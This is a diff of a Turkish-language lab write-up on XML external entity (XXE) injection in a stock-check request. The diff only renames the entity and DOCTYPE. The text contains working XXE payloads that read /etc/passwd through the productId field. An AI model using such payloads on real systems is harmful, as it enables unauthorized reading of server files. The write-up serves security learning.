@@ -12,9 +12,9 @@ Bu labda ürün stok kontrolü için gönderilen XML verisinin sunucu tarafında
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "file:///etc/passwd"> ]>
 <stockCheck>
-  <productId>&xxe;</productId>
+  <productId>&baris;</productId>
   <storeId>1</storeId>
 </stockCheck>
 ```
@@ -32,13 +32,13 @@ Bu labda ürün stok kontrolü için gönderilen XML verisinin sunucu tarafında
 3. XML verisinin başına external entity tanımı içeren bir `DOCTYPE` ekledim. Bu entity, sunucu dosya sistemindeki `/etc/passwd` dosyasını hedefliyordu.
 
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "file:///etc/passwd"> ]>
 ```
 
-4. Tanımladığım `xxe` entity'sini `productId` alanında çağırdım ve isteği tekrar gönderdim.
+4. Tanımladığım `baris` entity'sini `productId` alanında çağırdım ve isteği tekrar gönderdim.
 
 ```xml
-<productId>&xxe;</productId>
+<productId>&baris;</productId>
 ```
 
 ![XXE payload ile güncellenen XML isteği](images/lab1/3.png)
